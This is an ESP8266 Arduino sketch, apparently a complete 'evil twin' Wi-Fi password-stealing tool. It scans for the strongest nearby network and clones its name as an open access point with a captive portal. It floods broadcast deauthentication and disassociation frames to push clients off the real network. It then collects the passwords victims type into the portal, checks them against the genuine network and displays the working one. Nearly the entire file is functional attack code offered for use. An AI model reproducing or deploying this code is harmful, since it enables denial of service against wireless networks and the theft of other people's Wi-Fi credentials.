
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include "SSD1306Wire.h"

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
ESP8266WebServer webServer(80);
DNSServer dnsServer;
SSD1306Wire display(0x3c, D1, D2);
String displayTitle = "WIFI get pwd by jky";
String displayAPandPWD = "";

/*=====================================================================*/
bool isAttacking = false;
uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
  /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
  /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
};
uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
/*-------------------------------------------------------------------*/
bool sendDeauth(uint8_t type) {
  uint8_t packet[128];
  int packetSize = 0;
  for (int i = 0; i < sizeof(deauthPacket); i++) {
    packet[i] = deauthPacket[i];
    packetSize++;
  }
  for (int i = 0; i < 6; i++) {
    packet[4 + i] = clientMac[i];           //set target (client)
    packet[10 + i] = packet[16 + i] = apMac[i]; //set source (AP)
  }
  packet[0] = type;
  packet[24] = 0x01;
  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) return false;
  delay(1); //less packets are beeing dropped
  return true;
}

/*=====================================================================*/
#define maxResults 5
uint8_t apScanMac[maxResults][6];
int apChannels[maxResults];
int rssi[maxResults];
char apNames[maxResults][33];
int encryption[maxResults];
bool hidden[maxResults];
int maxRssi = -1;
/*---------------------------------------*/
bool apScan() {
  int rssi_num = -1000;
  int results = 0;
  //(async = false & show_hidden = true)
  results = WiFi.scanNetworks(false, true);
  for (int i = 0; i < results && i < maxResults; i++) {
    for (int j = 0; j < 6; j++) {
      apScanMac[i][j] = WiFi.BSSID(i)[j];
    }
    apChannels[i] = WiFi.channel(i);
    rssi[i] = WiFi.RSSI(i);
    String _ssid = WiFi.SSID(i);
    _ssid.replace("\"", "\\\"");
    _ssid.toCharArray(apNames[i], 33);
    encryption[i] = WiFi.encryptionType(i);
    hidden[i] = WiFi.isHidden(i);
    if (rssi[i] > rssi_num) {
      maxRssi = i;
      rssi_num = rssi[i];
    }
  }
  if (results == 0) return false;
  if (maxRssi == -1) return false;
  return true;
}

/*=====================================================================*/
const String postForms = "<html>\
  <head>\
    <title>Web Server POST handling</title>\
    <style>\
      body { background-color: #cccccc; font-family: Arial, Helvetica, Sans-Serif; Color: #000088; }\
    </style>\
  </head>\
  <body>\
    <h1>POST plain text to /postplain/</h1><br>\
    <form method=\"post\" enctype=\"application/x-www-form-urlencoded\" action=\"/postform/\">\
      <input type=\"text\" name=\"pwd\" value=\"world\"><br>\
      <input type=\"submit\" value=\"Submit\">\
    </form>\
  </body>\
</html>";
void handleRoot() {
  webServer.send(200, "text/html", postForms);
}
void handleForm() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "text/plain", "Method Not Allowed");
  } else {
    String message = "POST form was:\n";
    for (uint8_t i = 0; i < webServer.args(); i++) {
      message += " " + webServer.argName(i) + ": " + webServer.arg(i) + "\n";
    }
    if (webServer.hasArg("pwd")) {
      webServer.send( 200, "text/json", "true" );
      isAttacking = false;
      WiFi.mode(WIFI_STA);
      WiFi.begin((const char*)apNames[maxRssi], (const char*)webServer.arg("pwd").c_str());
      displayAPandPWD = apNames[maxRssi];
      int count = 0;
      while (WiFi.status() != WL_CONNECTED && count < 40)
      {
        delay(500);
        count++;
      }
      if (count >= 40) {
        WiFi.mode(WIFI_AP);
        WiFi.softAP((const char*)apNames[maxRssi], (const char*)"", apChannels[maxRssi]);
        displayAPandPWD = apNames[maxRssi];
        isAttacking = true;
      } else {
        displayAPandPWD = apNames[maxRssi] + String("=") + webServer.arg("pwd");
      }
    } else webServer.send(200, "text/json", "false");
  }
}

/*=============setup==============*/
void setup() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("jiangkaiyue");
  displayAPandPWD = "ap scan .....";
  if (apScan()) {
    WiFi.softAP((const char*)apNames[maxRssi], (const char*)"", apChannels[maxRssi]);
    displayAPandPWD = apNames[maxRssi];
    isAttacking = true;
  }

  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/postform/", handleForm);
  webServer.onNotFound(handleRoot);
  webServer.begin();
}

/*=============loop==============*/
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  /*----------------------deauther-----------------------*/
  if (isAttacking) {
    for (int i = 0; i < 10; i++) {
      //-----------------------------
      for (int j = 0; j < 6; j++) {
        apMac[j] = 0xFF;
        clientMac[j] = 0xFF;
      }
      sendDeauth(0xc0);
      sendDeauth(0xa0);
      //-----------------------------
      for (int j = 0; j < 6; j++) {
        apMac[j] = 0xFF;
        clientMac[j] = 0xFF;
      }
      sendDeauth(0xc0);
      sendDeauth(0xa0);
      delay(5);
    }
  }
  
  display.clear();
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(10, 10, String(millis()));
  display.drawString(20, 10, displayTitle);
  display.drawString(30, 10, displayAPandPWD);
  display.display();
  delay(10);
}
